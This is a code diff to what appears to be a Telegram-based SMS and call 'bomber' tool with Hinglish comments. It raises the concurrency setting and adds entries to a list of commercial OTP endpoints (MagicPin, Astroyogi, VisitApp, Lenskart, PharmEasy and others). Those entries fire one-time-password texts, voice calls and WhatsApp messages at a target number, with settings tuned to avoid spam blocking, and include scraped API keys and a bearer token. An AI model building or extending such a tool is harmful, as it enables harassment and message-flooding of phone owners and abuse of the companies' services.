@@ -25,9 +25,9 @@ BOT_TOKEN       = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT            = int(os.environ.get("PORT", 8000))
 
-# BALANCED SPEED (Taaki Spam Block na lage aur SMS lagataar aayein)
-CONCURRENCY     = 50
-DELAY           = 0.5
+# BALANCED SPEED (SMS block na ho isliye)
+CONCURRENCY     = 100  
+DELAY           = 0.5  
 REQUEST_TIMEOUT = 5
 # ============================================
 
@@ -43,9 +43,11 @@ def is_valid_target(num: str) -> bool:
 
 # =========================================================================
 #  ULTIMATE APIS (Diljot + Tsunami + Bombitup Ind + Bombitup Pak)
+#  SAAHI 200+ APIS YAHAN HAIN
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
+    UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
     E = []
 
     # ==========================================
@@ -55,6 +57,7 @@ def build_endpoints():
     E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
     E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
     E.append({"name":"MagicPin_Call","method":"POST","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","Origin":"https://magicpin.in","User-Agent":UA_D},"data":'{"phoneNumber":"91{t}","authMethod":"call","token":""}'})
+    E.append({"name":"Astroyogi_Call","method":"POST","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."},"data":'{"phoneCode":"91","countryCode":"IN","mobileNumber":"{t}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}'})
 
     # ==========================================
     # 2. BOMBITUP IND API APIS
@@ -93,9 +96,10 @@ def build_endpoints():
     E.append({"name":"MamaEarth_WA","method":"POST","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","headers":{"Content-Type":"application/json"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"HeroFinCorp_WA","method":"POST","url":"https://loans.apps.herofincorp.com/api/generateOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}","terms":true,"whatsapp":true}'})
     E.append({"name":"Refyne_WA","method":"POST","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","headers":{"Content-Type":"application/json"},"data":'{"channel":"WHATSAPP","recipient":"{t}"}'})
+    E.append({"name":"VisitApp_WA","method":"POST","url":"https://api.getvisitapp.com/v3/new-auth/login-phone","headers":{"Content-Type":"application/json"},"data":'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{t}","platform":"WEB"}'})
 
     # ==========================================
-    # 5. DILJOT / TSUNAMI SMS APIS
+    # 5. DILJOT / TSUNAMI SMS APIS (A to Z)
     # ==========================================
     E.append({"name":"Lenskart","method":"POST","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phoneCode":"+91","telephone":"{t}"}'})
     E.append({"name":"PharmEasy","method":"POST","url":"https://pharmeasy.in/api/v2/auth/send-otp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
